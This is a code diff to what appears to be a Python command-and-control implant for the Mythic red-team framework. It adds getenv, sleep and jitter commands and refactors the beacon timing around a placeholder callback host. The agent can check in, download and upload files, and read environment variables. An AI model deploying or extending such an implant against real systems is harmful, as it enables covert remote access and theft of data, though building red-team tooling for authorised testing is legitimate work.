@@ -7,7 +7,6 @@ import json
 import time
 import random
 import base64
-import uuid
 import os
 import sys
 # Command imports under this comment are used in the COMMANDS registry to link Mythic commands to their handler functions
@@ -19,13 +18,17 @@ from commands import pwd as cmd_pwd
 from commands import download as cmd_download
 from commands import upload as cmd_upload
 from commands import whoami as cmd_whoami
+from commands import getenv as cmd_getenv
+from commands import sleep as cmd_sleep
+from commands import jitter as cmd_jitter
+from commands import config as agent_config
 
 
 # --- Injected by builder via string substitution ---
 CALLBACK_HOST   = "REPLACE_CALLBACK_HOST"
 CALLBACK_PORT   = int("REPLACE_CALLBACK_PORT")
-SLEEP_INTERVAL  = float("REPLACE_SLEEP_INTERVAL")
-JITTER          = float("REPLACE_JITTER")
+agent_config.sleep_interval = float("REPLACE_SLEEP_INTERVAL")
+agent_config.jitter         = float("REPLACE_JITTER")
 AGENT_UUID      = "REPLACE_UUID"
 # ---------------------------
 
@@ -36,8 +39,8 @@ SESSION  = requests.Session()
 
 # Calculates jittered sleep time based on configured interval and jitter percentage
 def get_sleep_time():
-    jitter_amount = SLEEP_INTERVAL * (JITTER / 100)
-    return SLEEP_INTERVAL + random.uniform(-jitter_amount, jitter_amount)
+    jitter_amount = agent_config.sleep_interval * (agent_config.jitter / 100)
+    return agent_config.sleep_interval + random.uniform(-jitter_amount, jitter_amount)
 
 # Initial checkin to register this agent with Mythic, including system information and returning the callback ID assigned by Mythic for this agent
 def checkin():
@@ -115,6 +118,9 @@ COMMANDS = {
     "download": cmd_download.execute,
     "upload":   cmd_upload.execute,
     "whoami":   cmd_whoami.execute,
+    "getenv":   cmd_getenv.execute,
+    "sleep":    cmd_sleep.execute,
+    "jitter":   cmd_jitter.execute,
 }
 
 # Handles a single task by looking up the command in the registry and executing it
